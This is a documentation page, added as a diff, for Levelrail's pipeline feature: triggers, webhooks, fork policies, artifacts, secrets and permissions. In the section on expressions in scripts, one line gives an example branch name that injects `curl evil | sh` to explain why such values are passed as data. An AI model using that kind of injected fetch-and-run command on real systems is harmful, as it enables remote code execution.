@@ -1,0 +1,589 @@
+---
+title: "Pipelines"
+description: Define CI/CD pipelines as YAML with triggers, jobs, matrix builds, approvals, and deploys, and run them on your own nodes.
+"og:url": "https://docs.levelrail.com/pipelines"
+---
+
+A pipeline is a YAML file that describes what should happen when code changes: run tests in a container, build an image, wait for a person to approve, then deploy. Pipelines sit on top of the build and deploy features that already exist. They call those primitives; they never touch the reconciler, and no AI is involved in running one.
+
+Each pipeline belongs to one app. Open **Pipelines** in an app's sidebar, use the CLI (`levelrail-cli pipelines ...`), or the API under `/api/v1/apps/{name}/pipelines`.
+
+```mermaid
+flowchart LR
+  P["Push to main"] --> T["test stage<br/>go test ./..."]
+  T -->|success| B["build stage<br/>builds image, records output"]
+  B --> A{"approval gate<br/>(deploy ability)"}
+  A -->|approved| D["deploy stage<br/>blue-green, waits for ready"]
+  A -->|rejected| Cancel["run cancelled"]
+  D --> N["notify<br/>deploy notification targets"]
+```
+
+## A first pipeline
+
+```yaml
+version: 1
+name: release
+on:
+  push:
+    branches: [main]
+  manual: {}
+stages: [test, build, deploy]
+jobs:
+  test:
+    stage: test
+    image: golang:1.23
+    steps:
+      - run: go test ./...
+  build:
+    stage: build
+    steps:
+      - uses: build
+        id: image
+  ship:
+    stage: deploy
+    steps:
+      - uses: approval
+        with:
+          message: Deploy to production?
+          approvers: deploy
+      - uses: deploy
+        with:
+          strategy: blue-green
+      - uses: notify
+        with:
+          message: release shipped
+```
+
+What happens on a push to `main`:
+
+1. `test` runs `go test ./...` in a `golang:1.23` container with your repository checked out at `/workspace`.
+2. `build` starts once `test` succeeded (stages run in order). It builds the app's image from the same commit and records it as the job output `image`.
+3. `ship` pauses at the approval gate. Anyone holding the `deploy` ability can approve or reject it from the run page, the CLI, or the API.
+4. After approval, `deploy` points the app at the image `build` produced and waits until the app reports ready. `notify` then sends the message to the app's deploy notification targets.
+
+## Where to find it
+
+<img src="/assets/screenshots/pipelines-light.png" alt="Levelrail Pipelines page before any run exists, showing a sample pipeline file and the Create a pipeline button" className="block dark:hidden" />
+<img src="/assets/screenshots/pipelines.png" alt="Levelrail Pipelines page before any run exists, showing a sample pipeline file and the Create a pipeline button" className="hidden dark:block" />
+
+Open **Pipelines** in the main sidebar (or press the [command palette](/command-palette) and type "Pipelines") to see recent runs across every app you can read. The screenshot shows the first-run view, before any pipeline has run. The page shows how many runs are active, how many failed in the last 24 hours, how many wait for approval, and the 24 hour success rate. A "Needs attention" strip lists failed runs and runs waiting on an approval or a fork hold, with **Approve** and **Reject** buttons when you hold the required ability. The table below filters by status, app, pipeline name, and trigger, loads more on demand, and refreshes on its own while a run is active. Click a row to open the run. With no runs yet, the page shows a sample pipeline and a **Create a pipeline** button that asks for an app and opens its Pipelines tab.
+
+The same view is available from the CLI and API:
+
+```
+levelrail-cli pipelines runs --all --status failed --app web --limit 20
+levelrail-cli pipelines runs --all --json
+```
+
+`GET /api/v1/pipeline-runs` takes `status` (`running`, `failed`, `succeeded`, `cancelled`, `waiting_approval`, `held`), `app`, `pipeline`, `trigger`, `limit`, and a `cursor` from the previous page's `next_cursor`. `GET /api/v1/pipelines/summary` returns the counts. Both only include apps the caller may read.
+
+## Where pipeline files live
+
+You can edit a pipeline in the dashboard, or keep it in your repository. A repository copy is synced automatically (see [Repository sync](#repository-sync)) and can also be loaded by hand with the CLI:
+
+```
+levelrail-cli pipelines validate .pipelines/release.yaml
+levelrail-cli pipelines save my-app .pipelines/release.yaml
+levelrail-cli pipelines save my-app .            # every file in the repo's pipeline directory
+```
+
+A repository's pipeline directory is found by trying `.pipelines/`, then `.ci/pipelines/`, then a directory named after the platform's brand (the CLI asks the control plane for it). `validate` runs locally with no API call, so it works in CI and pre-commit hooks. `save` copies the file into the control plane.
+
+The JSON Schema behind validation is served at `GET /api/v1/pipelines/schema`, and the dashboard editor shows problems by line.
+
+## Repository sync
+
+When the app has a git repository connected, its pipeline directory is the source for its pipeline definitions. On every push to the app's tracked branch the control plane reads the directory at that commit (a shallow, in-memory clone with the app's deploy token) and saves each `*.yaml` and `*.yml` file. A pipeline is named by its `name:` field, or by the file name without its extension. The push's own pipelines start after the sync finishes, so a run uses the pipeline files of the commit that triggered it. A push to any other branch, and a tag push, does not sync.
+
+```
+levelrail-cli pipelines sync my-app
+levelrail-cli pipelines sync my-app --repo-truth=true
+```
+
+The Pipelines page shows a **synced from `<sha>`** badge, a **Sync now** button, and a per-app **Repository is source of truth** switch. Each pipeline synced from the repository carries a `repo <sha>` badge.
+
+Editing a synced pipeline in the dashboard is allowed, and it is never lost silently:
+
+| Situation | Result |
+| --- | --- |
+| The definition was not edited since the last sync | The sync updates it to the repository's version |
+| It was edited (or was created in the dashboard with the same name) and the repository differs | It is kept, marked **edited since sync**, and reported as `diverged` |
+| The switch **Repository is source of truth** is on | The repository's version overwrites the edit |
+
+A file that fails validation, is larger than 256 KiB, repeats another file's name, or has deploy, promote, rollback, or notify steps that act on a different app is reported as `invalid` or `refused` and not saved: steps that act on other apps can only be saved through the API by a caller with the `root` ability, and a push must not be able to grant that. At most 64 files are read. A definition whose file is deleted from the repository is left in place; delete it in the dashboard.
+
+## Triggers
+
+```yaml
+on:
+  push:
+    branches: [main, "release/*"]
+  pull_request:
+    branches: [main]
+  tag:
+    patterns: ["v*"]
+  schedule: ["0 3 * * *"]
+  manual: {}
+  api: true
+  webhook: {}
+```
+
+| Trigger | Starts a run when |
+| --- | --- |
+| `push` | a push reaches a matching branch (through the app's git webhook) |
+| `pull_request` | a pull request is opened or updated against a matching branch |
+| `tag` | a tag matching a pattern is pushed |
+| `merge_group` | GitHub's merge queue asks for checks on a queued group |
+| `schedule` | a five-field cron expression comes due (missed runs are not replayed) |
+| `manual` | someone starts it from the dashboard or CLI, with the declared parameters |
+| `api` | an API token starts it |
+| `webhook` | another system POSTs to the pipeline's secret webhook URL |
+
+A trigger key with no value (`push:`) means "on, any branch". A file with no `on` block is manual and API only. Branch and tag filters accept `*` (within one path segment) and `**`. A `pull_request` trigger's `branches` filter matches the pull request's target branch.
+
+### Parameters
+
+A pipeline declares the values a run may set. Manual runs, API calls, and webhooks all use the same list, and the server validates every value before a run is queued.
+
+```yaml
+parameters:
+  - { name: environment, type: choice, choices: [staging, production], default: staging }
+  - { name: skip_tests, type: boolean, default: false }
+  - { name: release_note, required: true, description: Shown in the deploy notification }
+```
+
+| Field | Meaning |
+| --- | --- |
+| `name` | Letters, digits, and underscores, starting with a letter |
+| `type` | `string` (the default), `choice` (value must be one of `choices`), or `boolean` (`true` or `false`) |
+| `default` | Used when the run does not set the value |
+| `required` | The run is rejected when the value is empty |
+| `description` | Shown under the field in the **Run with parameters** dialog |
+
+The older `on.manual.inputs` map still works and accepts the same fields (`options` is the older spelling of `choices`). A value that is not declared, not one of the choices, not `true` or `false` for a boolean, or longer than `APP_PIPELINE_INPUT_MAX_BYTES` (4096) is rejected with a 400 and nothing is queued.
+
+Parameters are recorded on the run and shown on the run page. Scripts read them as <span v-pre>`${{ inputs.name }}`</span> (passed as data, like every attacker-influenced value) or as the environment variable `PIPELINE_INPUT_<NAME>`.
+
+```
+levelrail-cli pipelines run my-app ship --param environment=production --param skip_tests=true
+```
+
+### Webhook triggers
+
+`webhook: {}` under `on` lets another system start the pipeline by POSTing to a secret URL. Turn the trigger on from the **Webhook** button on the pipeline row, or with the CLI:
+
+```
+levelrail-cli pipelines triggers my-app ship --enable --hmac
+levelrail-cli pipelines triggers my-app ship --deliveries
+levelrail-cli pipelines triggers my-app ship --replay <delivery-id>
+levelrail-cli pipelines triggers my-app ship --rotate
+```
+
+The URL is `POST /api/v1/hooks/pipeline/{pipeline-id}/{token}`. It needs no session: the token is the credential. It is shown once when created or rotated and only its sha256 is stored, so a lost token is replaced with **Rotate**, which invalidates the old URL at once. A wrong token, an unknown pipeline, and a disabled trigger all answer the same 404.
+
+- **Signatures.** With `--hmac` the caller must also send `X-Hub-Signature-256: sha256=<hex>`, the HMAC SHA-256 of the raw body under the signing secret (shown once, held in the encrypted secrets store). This is the same scheme GitHub uses, so GitHub webhooks can point at the URL directly.
+- **Body.** The body must be `application/json` (valid JSON), `application/x-www-form-urlencoded`, or `text/plain`, and at most `APP_PIPELINE_WEBHOOK_MAX_BODY` bytes (65536). It is stored on the run and exposed to jobs as `PIPELINE_WEBHOOK_PAYLOAD` and `PIPELINE_WEBHOOK_CONTENT_TYPE`. It is data only: it is never interpolated into a script or executed.
+- **Parameters.** Query-string values set declared parameters (`?environment=production`). `ref` and `sha` set the run's ref and commit.
+- **Retries.** Send an `Idempotency-Key` header (GitHub's `X-GitHub-Delivery` also works). A repeated key returns the first run with `"status": "duplicate"` and starts nothing.
+- **Limits.** Requests are rate limited per client and pipeline (`APP_WEBHOOK_RATE_LIMIT_RPM`).
+- **History.** Every authenticated delivery is kept (`APP_PIPELINE_WEBHOOK_DELIVERIES_KEEP`, 100 per pipeline) with its outcome and reason. **Replay** starts a new run from an accepted delivery's stored body and query. Deliveries rejected for a bad signature, content type, or size cannot be replayed.
+
+### Path filters
+
+`push` and `pull_request` triggers can limit runs by the files a change touched:
+
+```yaml
+on:
+  push:
+    branches: [main]
+    paths: ["src/**", "go.mod"]
+    paths_ignore: ["**/*_test.go"]
+  pull_request:
+    types: [opened, synchronize]
+    paths_ignore: ["docs/**", "**/*.md"]
+```
+
+A run starts when at least one changed file matches `paths` (or `paths` is empty) and is not matched by `paths_ignore`. A change that fails the filter starts no run and is recorded in **Recent triggers** as `skipped: no changed path matched paths` or `skipped: every changed path matched paths_ignore`. Globs support `*` and `?` within one path segment, `**` as a whole segment, `[abc]` classes, and `{a,b}` alternatives. Dotfiles match like any other file, and Windows separators are treated as `/`.
+
+The changed files come from the webhook payload when it lists them (GitHub, GitLab, and Gitea push events do, up to 20 commits). Otherwise the control plane asks the git provider (compare, pull request files, or diffstat on Bitbucket) using the connected provider credentials. If the file list cannot be read (no credentials, a rate limit, a new branch with no base commit), the run starts anyway. A filter never blocks a run because of a lookup failure.
+
+`types` on `pull_request` limits which actions start a run: `opened` (a new pull request), `reopened`, and `synchronize` (new commits). Empty means all three. Bitbucket does not report reopens separately. `merge_group` takes `branches` only, no path filters. A change list longer than the provider's paging limit is treated as unknown and the run starts.
+
+### Merge queues
+
+```yaml
+on:
+  merge_group:
+    branches: [main]
+```
+
+GitHub's merge queue sends a `merge_group` webhook when it wants checks on a queued group. A `merge_group` trigger starts a run on the group's head commit, so the required status appears on the queue's temporary branch. Subscribe the repository webhook to the "Merge groups" event. `branches` matches the branch the group merges into.
+
+### Reporting status to the git provider
+
+A run posts its state to the provider that hosts the app's repository as a commit status named after the brand short name and the pipeline (`<short name>/pipeline/<name>`): `pending` when it starts, then `success`, `failure`, or `error` (cancelled). The status links to the run page when a dashboard URL is set under Settings. Providers: GitHub commit statuses, GitLab commit statuses, Gitea statuses, and Bitbucket build statuses.
+
+Reporting is on by default when the app has a connected git source and provider credentials. Turn it off per pipeline with `report_status: false`, per app with `levelrail-cli apps git-source settings my-app --report-status=false` (or the app's Source page), or for the whole server with `APP_GIT_STATUS_ENABLED=false`. A failed post (a rate limit, a revoked token) never fails or delays the run: the run records a warning and the runs list shows it in the **Forge status** column. Runs list the last status they posted as a link to the commit.
+
+```yaml
+report_status: true
+```
+
+`levelrail-cli pipelines save my-app ci.yaml --paths "src/**" --paths-ignore "**/*.md" --report-status=false` applies the same fields to the file before saving. The pipeline editor has the fields too.
+
+### Pull requests from forks
+
+A pull request from another repository carries code you have not reviewed, and a pipeline can read the app's secrets. Each `pull_request` trigger therefore sets a fork policy:
+
+```yaml
+on:
+  pull_request:
+    branches: [main]
+    forks: approve
+```
+
+| `forks` | What happens to a pull request from a fork |
+| --- | --- |
+| `block` (default) | No run is created. The decision is recorded in the trigger log. |
+| `approve` | A run is created held for approval. No job starts, no container is created, and no secret is read until someone with the `deploy` ability approves it on the run page or with `levelrail-cli pipelines approve`. A rejected run is cancelled. |
+| `allow` | The run starts as for any other pull request. |
+
+A pull request whose head repository cannot be determined from the webhook payload (for example a deleted fork) is treated as a fork. Held runs never delay other runs in the same concurrency group. GitHub, GitLab, Gitea, and Bitbucket are all checked.
+
+### Why a push did not start a run
+
+The Pipelines page lists **Recent triggers**: for each recent push, tag, or pull request, whether a run started, was held, or was skipped, and why (a branch filter that did not match, a fork blocked by policy, an invalid definition, or no pipeline listening for that event). `levelrail-cli pipelines triggers my-app` prints the same list, and the API serves it at `GET /api/v1/apps/{name}/pipeline-triggers`. The newest 200 decisions per app are kept.
+
+## Jobs and steps
+
+A job runs in one container, on one node, with a workspace volume mounted at `/workspace`. Steps run in order inside that container.
+
+```yaml
+jobs:
+  test:
+    image: node:22
+    node: build-1             # optional, default is the local node
+    env: { CI: "true" }
+    resources: { memory: 2Gi, cpu: 2 }
+    timeout: 20m
+    retries: 1                # re-run the whole job once if it fails
+    cache:
+      - { key: npm, path: /root/.npm }
+    steps:
+      - run: npm ci
+      - run: npm test
+        env: { NODE_ENV: test }
+        timeout: 10m
+        retries: 2
+        continue_on_error: true
+```
+
+Steps that run in the container: `run` (a shell script), `test` (`with.command`), `artifact-upload`, and `artifact-download`. Steps that act through the control plane, with no container: `build`, `deploy`, `promote`, `rollback`, `notify`, and `approval`. A job made only of those steps starts no container and needs no `image`.
+
+| Step | `with` keys | Effect |
+| --- | --- | --- |
+| `build` | `type` (`dockerfile` or `railpack`), `context`, `dockerfile`, `image`, `tag` | Builds an image from the run's commit with the same builder deploys use. Sets the output `image`. It does not deploy. |
+| `deploy` | `service`, `image`, `strategy`, `wait` | Points a service at an image and waits for it to become ready. `image` defaults to the `image` output of a needed job. `strategy` is `rolling`, `recreate`, or `blue-green`. |
+| `promote` | `from`, `to` | Deploys the image currently running in `from` to `to`. |
+| `rollback` | `service` | Redeploys the previous known-good image. |
+| `notify` | `message`, `app`, `on` (`always`, `success`, `failure`) | Sends a message to the app's deploy notification targets. |
+| `approval` | `message`, `approvers` (`deploy`, `write`, `root`), `timeout` | Pauses the job until someone with that ability decides. |
+| `artifact-upload` | `name`, `path` | Copies files from the workspace into a run-wide artifact. |
+| `artifact-download` | `name`, `path` | Copies an artifact into the workspace. |
+
+Approval steps must come before any step that uses the container, because the container is not started while a job waits. `service`, `from`, `to`, and `app` must be literal names. Steps that target a different app than the pipeline's own can only be saved by a caller with the `root` ability.
+
+Every step accepts `if`, `timeout`, `retries`, `continue_on_error`, `env`, and `secrets`. A step after a failed one is skipped unless its `if` says otherwise (`if: failure()` or `if: always()`).
+
+### Reusable steps
+
+```yaml
+templates:
+  go-test:
+    params: [pkg]
+    steps:
+      - run: go test ${{ inputs.pkg }}
+jobs:
+  test:
+    image: golang:1.23
+    steps:
+      - uses: template/go-test
+        with: { pkg: ./... }
+```
+
+Templates are expanded when the file is parsed. A template cannot use another template.
+
+### Expressions in scripts
+
+<span v-pre>In a `run` (or `test` `command`) script, `${{ branch }}`, `${{ ref }}`, `${{ tag }}`, `${{ actor }}`, `${{ inputs.* }}` and `${{ needs.*.outputs.* }}` are not pasted into the script text, because a branch name or PR author is attacker-controlled. Each is passed to the shell as an environment variable and the script sees a `${PIPELINE_EXPR_*}` reference instead, so a branch named `x; curl evil | sh` is only ever data. `${{ matrix.* }}`, `${{ env.* }}`, `${{ secrets.* }}`, `${{ sha }}`, `${{ app }}`, `${{ job }}`, `${{ run.* }}` and `${{ pipeline }}` come from the pipeline file or validated identifiers and are still substituted directly. Inside single quotes the reference is not expanded, so write `"${{ branch }}"` rather than `'${{ branch }}'`, and quote it when it may contain spaces.</span>
+
+### Artifacts and caches
+
+A job can keep files for later jobs and for download:
+
+```yaml
+jobs:
+  build:
+    image: golang:1.23
+    artifacts: [bin, dist/report.html]
+    steps:
+      - run: go build -o bin/app ./cmd/app
+  test:
+    needs: [build]
+    image: golang:1.23
+    steps:
+      - run: ./bin/app --self-test
+```
+
+When `build` succeeds, the listed paths are archived out of its workspace and stored on the control plane. Any job that `needs` it starts with those files restored into its own `/workspace` (after checkout), on any node. The paths are literal files or directories relative to the workspace; globs, absolute paths, and `..` are rejected when the file is saved.
+
+- **Storage.** Archives live under `APP_PIPELINE_ARTIFACT_DIR` (default `<data dir>/pipeline-artifacts`), one gzip tar per job, with a sha256 recorded when stored and checked again while every restore and download streams. A mismatch fails the restore or download instead of serving damaged files.
+- **Limits.** `APP_PIPELINE_ARTIFACT_MAX_BYTES` (256 MiB) caps one stored archive, `APP_PIPELINE_ARTIFACT_MAX_RUN_BYTES` (1 GiB) all archives of a run, `APP_PIPELINE_ARTIFACT_MAX_UNPACKED_BYTES` (1 GiB) what an archive may expand to, and `APP_PIPELINE_ARTIFACT_MAX_ENTRIES` (100000) the files, directories and links in one archive. Caps are enforced while the bytes stream, so a job that goes over stops early and leaves no partial file.
+- **Retention.** `APP_PIPELINE_ARTIFACT_RETENTION` (168h) after the upload. Expired archives, and archives of pruned runs, are deleted.
+- **Safety.** Every entry of the tar is checked as it streams. Absolute or `..` names, entries outside the declared path, symlinks or hard links that point outside the workspace, writes through a symlink, device, pipe and sparse entries, or a value of a secret the job used are rejected, and the job fails with the reason instead of reporting success without its artifacts. Permissions are normalised (setuid, setgid and sticky bits are dropped) and extended attributes are not kept.
+- **Download.** The run page lists each artifact with its size and checksum, and `levelrail-cli pipelines artifacts my-app <run-id> --download build` fetches one. The server streams the file from disk with its `Content-Length` and an `X-Content-SHA256` header, and the CLI writes to a temporary file, checks the hash, and only then renames it into place. Downloads need the `read` ability.
+
+#### How artifacts move
+
+Artifacts travel through the Docker Engine archive endpoints (`GET` and `PUT /containers/{id}/archive`), not through a shell inside the job image. The job image needs no `tar`, `base64`, `realpath` or `mktemp`, and can be `scratch`-based as long as the files exist.
+
+1. After a job succeeds, the control plane asks the node's runtime for the tar of each declared path under `/workspace`. Docker names the top entry after the last path element, so entries are rebased to their workspace path.
+2. Each entry is validated and rewritten into one gzip tar that is written straight to a temporary file while the sha256 and the size are counted. The caps are checked per write, a violation deletes the temporary file, and success renames it into place.
+3. To restore, the stored file is streamed into the next job's container with the archive `PUT` at `/workspace`, hashing as it is read. The sha256 is verified at the end of the stream: a mismatch fails the job step with a clear reason. The bytes read before the mismatch was known were already unpacked into that job's workspace, which is discarded with the failed job. Nothing is extracted through a shell.
+4. On a remote node the same two operations ride the existing agent session as a new archive mode of the exec frame stream. It reuses its chunked frames, windowed credit (backpressure), cancel on context end, and the node's mTLS identity, and carries the size cap to the agent so the cap also stops the stream on the node. Local and remote nodes share one runtime interface, so the engine has a single code path.
+5. The stored artifact is never modified by a restore. If the restore fails after a good upload, the job that needed it fails with the reason and the artifact stays for download and for a re-run.
+
+The `artifact-upload` and `artifact-download` steps remain for moving files between steps of one run on the same node, through a per-run volume. Their paths must also stay inside the workspace.
+
+A `cache` entry mounts a named volume that survives between runs of the same app, keyed by `key`.
+
+### A worked example: build, test, deploy
+
+The full file is [`test/fixtures/pipelines/ship-with-artifact.yaml`](https://github.com/glincker/levelrail/blob/main/test/fixtures/pipelines/ship-with-artifact.yaml).
+
+```yaml
+version: 1
+name: ship
+on:
+  push:
+    branches: [main]
+  manual: {}
+  webhook: {}
+parameters:
+  - { name: environment, type: choice, choices: [staging, production], default: staging }
+  - { name: skip_tests, type: boolean, default: false }
+  - { name: release_note, description: Shown in the deploy notification }
+stages: [build, test, deploy]
+jobs:
+  build:
+    stage: build
+    image: golang:1.23
+    artifacts: [bin]
+    steps:
+      - run: go build -o bin/app ./cmd/app
+      - uses: build
+        id: image
+  test:
+    stage: test
+    image: golang:1.23
+    steps:
+      - run: ./bin/app --self-test
+      - run: go test ./...
+        if: success() && inputs.skip_tests != 'true'
+  deploy:
+    stage: deploy
+    steps:
+      - uses: approval
+        with:
+          message: Deploy to ${{ inputs.environment }}?
+      - uses: deploy
+        with:
+          strategy: blue-green
+      - uses: notify
+        with:
+          message: ${{ inputs.release_note }}
+```
+
+`build` compiles the binary, keeps `bin/` as an artifact, and builds the image. `test` starts with `bin/app` already in its workspace, so it tests the exact binary that was built, and skips the unit tests when `skip_tests` is true. `deploy` waits for approval, then deploys the image `build` produced. If `build` fails, `test` and `deploy` are skipped and the run page says `needed job build failed`.
+
+## Dependencies, stages, and matrix
+
+`needs` builds a directed graph of jobs. `stages` is shorthand: a job in a later stage waits for every job in the earlier ones.
+
+```yaml
+jobs:
+  test:
+    image: golang:1.23
+    matrix:
+      go: ["1.22", "1.23"]
+      os: [alpine, bookworm]
+      exclude:
+        - { go: "1.22", os: bookworm }
+    steps:
+      - run: echo testing on go ${{ matrix.go }} / ${{ matrix.os }}
+  publish:
+    needs: [test]
+    steps:
+      - uses: build
+```
+
+A matrix job becomes one job per combination (named like `test[go=1.23,os=alpine]`), up to 256. `needs: [test]` waits for all of them. Dependency cycles are rejected when the file is validated.
+
+## Conditions and expressions
+
+`if` accepts `==`, `!=`, `&&`, `||`, `!`, parentheses, string literals in single quotes, and the functions `success()`, `failure()`, `cancelled()`, `always()`, `contains()`, `startsWith()`, and `endsWith()`. The same values are available inside <span v-pre>`${{ }}`</span> anywhere in a step's `run`, `env`, or `with`.
+
+| Value | Meaning |
+| --- | --- |
+| `app`, `trigger`, `actor`, `ref`, `branch`, `tag`, `sha` | Run metadata |
+| `run.number`, `run.id`, `job` | The run and the current job |
+| `inputs.<name>` | Manual inputs |
+| `matrix.<name>` | The current matrix combination |
+| `env.<name>` | Pipeline and job `env` values |
+| `needs.<job>.result` | `success`, `failure`, `skipped`, or `cancelled` |
+| `needs.<job>.outputs.<name>` | Outputs of a needed job |
+| `secrets.<NAME>` | An app secret (see below) |
+
+A step can publish an output by printing a line of the form `::set-output name=key::value`.
+
+```yaml
+- uses: deploy
+  if: branch == 'main' && needs.test.result == 'success'
+```
+
+## Secrets
+
+Secrets come from the app's existing secrets (`PUT /api/v1/apps/{name}/secrets/{key}`, or **Environment** in the dashboard). Use <span v-pre>`${{ secrets.NAME }}`</span> in a step, or list names under a step's `secrets:` to export them as environment variables. Values are sent to the container through standard input, not command arguments, and are masked (`***`) in stored logs. A missing secret fails the step before it runs.
+
+Pipeline steps can read every secret of their own app, so treat write access to a pipeline as write access to those secrets.
+
+### Cloud credentials via OIDC
+
+A job can opt into a short-lived, signed OIDC token instead of a long-lived cloud credential stored as a secret:
+
+```yaml
+jobs:
+  deploy:
+    image: amazon/aws-cli
+    oidc:
+      audience: sts.amazonaws.com
+    steps:
+      - run: aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN --web-identity-token "$PIPELINE_OIDC_TOKEN" --role-session-name pipeline
+```
+
+The token arrives as the `PIPELINE_OIDC_TOKEN` env var (masked in logs, same as a secret), valid for 10 minutes. See [Pipelines: OIDC federation](/pipelines-oidc) for the full claim shape and how to wire it to AWS IAM, GCP workload identity federation, or Vault.
+
+## Concurrency, timeouts, and retries
+
+```yaml
+concurrency:
+  group: deploy-${{ branch }}
+  cancel_in_progress: true
+timeout: 2h
+```
+
+Runs that share a group run one at a time, oldest first. With `cancel_in_progress`, a newer run cancels older active runs in its group instead of waiting behind them. `timeout` on the pipeline, a job, or a step bounds each. Retries re-run only what failed: a step retry re-runs that step, a job retry re-runs the job's steps from the start.
+
+## Running and watching
+
+```
+levelrail-cli pipelines run my-app release --ref refs/heads/main --param env=staging --follow
+levelrail-cli pipelines runs my-app
+levelrail-cli pipelines runs my-app <run-id>
+levelrail-cli pipelines logs my-app <run-id> --job "test[go=1.23]" --follow
+levelrail-cli pipelines approve my-app <run-id> --comment "ship it"
+levelrail-cli pipelines cancel my-app <run-id>
+levelrail-cli pipelines artifacts my-app <run-id> --download build --out build.tar.gz
+```
+
+The run page in the dashboard draws the jobs as a dependency graph: columns by depth, a curved edge from each job to the jobs that need it, one node per matrix job with a row per combination, and a status icon and duration on every job. Click a job, or move between jobs with the arrow keys and press Enter, to see its steps and output. Status animation stops when the system asks for reduced motion. A skipped job shows why (`needed job build failed`).
+
+When a run fails, a summary at the top names the failed job, the failing step and its exit code, and the reason, and lists the jobs skipped because of it. Below the logs, the page shows how the run started (git push, manual, API, schedule, or webhook, and who), the parameters it ran with, the size of a webhook body if there was one, and the artifacts the jobs stored with a download button for each.
+
+Below the graph, every step shows its status and duration. Click a step to narrow the log to that step (click it again for the whole job). The log has a text filter, a stderr toggle, and a level filter. The link button on a step copies a URL that opens the run on that job and step (`?job=...&step=...`). The page streams a running job's output live and offers **Approve**, **Reject**, **Cancel**, and **Re-run**. Log lines are capped per job, and old runs are pruned to the newest 100 per pipeline.
+
+The MCP server exposes `list_pipeline_runs`, `list_all_pipeline_runs` (runs across every app), and `explain_pipeline_run`. All are read-only: the second reports the failed job and step, its exit code, the tail of its output, and any approval it is waiting on.
+
+## Starter templates
+
+Ten tested starter pipelines cover Node (test, deploy, version matrix), Go (test, tagged release), Python, a static site, a plain Dockerfile deploy, a monorepo with path filters, and a nightly cron job. Pick one in the dashboard from **Use a template** on a pipeline list, or from the CLI:
+
+```
+levelrail-cli pipelines templates
+levelrail-cli pipelines templates go-ci --out go-ci.yaml
+levelrail-cli pipelines templates node-ci --create web
+```
+
+`GET /api/v1/pipelines/templates` lists them and `GET /api/v1/pipelines/templates/{id}` returns one with its file. Every template is validated in the test suite.
+
+## Failed jobs, fixes, flaky jobs and timing
+
+When a run fails, the run page matches the failed job's output against known error patterns (network and registry timeouts, out of memory, job timeout, full disk, missing credentials, missing image or tool, npm, Python and Go version problems) and shows a typed **Fix** per match:
+
+- **Rerun**, **Add retries**, **Raise timeout** and **Raise memory** are applied by the control plane. The pipeline file is edited in place (comments are kept), re-validated, saved, and optionally rerun. Pipelines synced from the repository are not edited here, change the file in the repository instead.
+- Other fixes point at the one place the change lives: the pipeline editor, the app's secrets, or the node's disk.
+
+```
+levelrail-cli pipelines fixes web <run-id>
+levelrail-cli pipelines fixes web <run-id> --apply add_retries --job test --rerun
+levelrail-cli pipelines insights web ci
+```
+
+`GET /api/v1/apps/{name}/pipeline-runs/{id}/fixes` lists suggestions and `POST .../fixes/apply` applies one (`kind`, `job`, `rerun`). `GET /api/v1/apps/{name}/pipelines/{pname}/insights` returns, over the last 30 finished runs, each job's failure rate, median time and latest time, plus a timing diff of the newest run against the latest earlier run where everything passed. A job is flagged **flaky** when it both passed and failed on the same commit, passed only after a retry, or flips between pass and fail often at a failure rate that is neither rare nor constant.
+
+## Permissions
+
+| Action | Ability |
+| --- | --- |
+| Read pipelines, runs, and logs | `read` |
+| Create, edit, delete a pipeline | `write` |
+| Start, cancel, or re-run a run, or replay a webhook delivery | `deploy` |
+| List and download a run's artifacts, see webhook deliveries | `read` |
+| Create, rotate, or delete a pipeline's webhook trigger | `write:sensitive` |
+| Decide an approval gate | `deploy`, plus the gate's own `approvers` ability |
+| Release or reject a run held for approval | `deploy` |
+| Sync pipeline files, or change the source-of-truth setting | `write` |
+
+## How runs are executed
+
+The engine stores every run, job, and step in the database with a status and a reason, and re-derives what to do from that state on each pass. If the control plane restarts, jobs recorded as running are picked up again: leftover containers are removed, finished steps are skipped, and the interrupted step runs again. Write steps so that running them twice is safe.
+
+Environment variables tune the engine: `APP_PIPELINE_MAX_PARALLEL_JOBS` (default 4), `APP_PIPELINE_MAX_LOG_LINES` (50000 per job), `APP_PIPELINE_STEP_TIMEOUT` (30m), `APP_PIPELINE_JOB_TIMEOUT` (1h), `APP_PIPELINE_APPROVAL_TIMEOUT` (72h), `APP_PIPELINE_KEEP_RUNS` (100), `APP_PIPELINE_GIT_IMAGE` (the image used for checkout, default `alpine/git`), `APP_PIPELINE_TICK_INTERVAL` (default 2s, only while a run is active) and `APP_PIPELINE_IDLE_INTERVAL` (default 1m, the safety net poll when no run is active; starting a run wakes the engine at once). Artifact, parameter, and webhook limits are listed in their own sections above.
+
+## Current limits
+
+- There is no pipeline-level `finally` block yet. For cleanup after a failure, end the job with a step that has `if: always()`.
+- Checkout and `build` need a git source connected to the app. Without one, container jobs run with an empty workspace.
+- The `build` step clones the repository itself instead of reading the job workspace, so files created by earlier steps are not part of the build context.
+- The `artifact-upload` and `artifact-download` steps are per node. Use the job-level `artifacts` list to hand files to a job on another node.
+- Artifacts are stored on the control plane's disk, not in S3, and are included in no backup.
+- Copy-out and copy-in have so far only run against fakes and a loopback mTLS session, never against a real Docker daemon. Still to be checked on a real node: a multi-gigabyte archive, a symlink and hard links produced inside a real image, file ownership after restore (entries keep the numeric uid and gid they had), and a rootless Docker.
+- Workspace and artifact volumes are removed automatically on the local node; on remote nodes they are left for the volume cleanup.
+- `deploy`, `promote`, and `rollback` refuse services in a protected environment.
+- Re-running only the failed jobs of a run is not available. **Re-run** starts a new run from the beginning: approval decisions are per run, so resuming inside a finished run would reuse stale approvals.
+- Sync reads the tracked branch only, and only over HTTPS (with the deploy token when one is set).
+
+## Next steps
+
+<CardGroup cols={2}>
+<Card title="OIDC federation" href="/pipelines-oidc">
+
+Short-lived cloud credentials for jobs, no stored keys.
+
+</Card>
+<Card title="Git integrations" href="/git-integrations">
+
+Connect the repository that triggers and feeds pipelines.
+
+</Card>
+<Card title="Platform as code" href="/platform-as-code">
+
+Manage pipelines as `Pipeline` documents alongside apps.
+
+</Card>
+<Card title="GitHub Actions" href="/github-actions">
+
+Deploy from an external CI instead.
+
+</Card>
+</CardGroup>
